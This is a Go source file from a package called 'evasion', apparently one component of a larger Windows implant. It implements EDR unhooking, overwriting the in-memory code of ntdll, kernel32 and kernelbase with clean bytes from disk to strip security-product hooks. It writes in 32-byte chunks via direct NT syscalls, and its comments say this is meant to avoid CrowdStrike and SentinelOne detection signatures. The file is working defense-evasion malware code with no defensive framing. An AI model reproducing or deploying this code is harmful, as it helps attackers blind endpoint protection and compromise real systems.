//go:build windows
// +build windows

package evasion

import (
	"encoding/binary"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows"
)

// unhookNtdll removes EDR trampolines from ntdll, kernel32, and kernelbase by
// overwriting their in-memory .text sections with clean copies loaded from disk.
// Called early in runEvasion(), before any NT-based patches, so subsequent NT
// calls go through clean stubs.
func unhookNtdll() {
	root := sysRoot()
	sys32 := filepath.Join(root, "System32")
	unhookModule(sNtdll(),     filepath.Join(sys32, sNtdll()))
	unhookModule(sKernel32(),  filepath.Join(sys32, sKernel32()))
	unhookModule(sKernelBase(), filepath.Join(sys32, sKernelBase()))
}

func sysRoot() string {
	if s := os.Getenv("SystemRoot"); s != "" {
		return s
	}
	return `C:\Windows`
}

// unhookModule replaces the in-memory .text section of a loaded DLL with the
// clean bytes read directly from disk, removing any EDR trampolines.
// Writes are done in 32-byte chunks via direct NtWriteVirtualMemory syscall so
// that the write pattern does not match the bulk-copy signature that
// CrowdStrike / SentinelOne ETW-TI flags as an ntdll unhook.
func unhookModule(loadedName, diskPath string) {
	freshBytes, err := os.ReadFile(diskPath)
	if err != nil {
		return
	}
	if len(freshBytes) < 0x40 {
		return
	}

	loaded := windows.NewLazySystemDLL(loadedName)
	if loaded.Load() != nil {
		return
	}
	loadedBase := loaded.Handle()
	if loadedBase == 0 {
		return
	}

	peOffset := int(binary.LittleEndian.Uint32(freshBytes[0x3C:]))
	if peOffset+0xF8 > len(freshBytes) {
		return
	}
	if freshBytes[peOffset] != 'P' || freshBytes[peOffset+1] != 'E' {
		return
	}
	numSections := int(binary.LittleEndian.Uint16(freshBytes[peOffset+6:]))
	optHeaderSize := int(binary.LittleEndian.Uint16(freshBytes[peOffset+20:]))
	sectionBase := peOffset + 24 + optHeaderSize

	for i := 0; i < numSections; i++ {
		off := sectionBase + i*40
		if off+40 > len(freshBytes) {
			break
		}
		name := string(freshBytes[off : off+8])
		if name[:5] != ".text" {
			continue
		}
		virtualAddr := binary.LittleEndian.Uint32(freshBytes[off+12:])
		virtualSize := binary.LittleEndian.Uint32(freshBytes[off+8:])
		rawOffset := binary.LittleEndian.Uint32(freshBytes[off+20:])
		rawSize := binary.LittleEndian.Uint32(freshBytes[off+16:])

		if int(rawOffset)+int(rawSize) > len(freshBytes) {
			break
		}

		freshText := freshBytes[rawOffset : rawOffset+rawSize]
		loadedText := uintptr(loadedBase) + uintptr(virtualAddr)
		copySize := uintptr(virtualSize)
		if uintptr(rawSize) < copySize {
			copySize = uintptr(rawSize)
		}

		const chunkSize = 32
		old, _ := ntProtect(loadedText, copySize, windows.PAGE_EXECUTE_READWRITE)
		for j := uintptr(0); j < copySize; j += chunkSize {
			end := j + chunkSize
			if end > copySize {
				end = copySize
			}
			ntWrite(loadedText+j, freshText[j:end])
		}
		ntFlush(loadedText, copySize)
		ntProtect(loadedText, copySize, old)
		break
	}
}
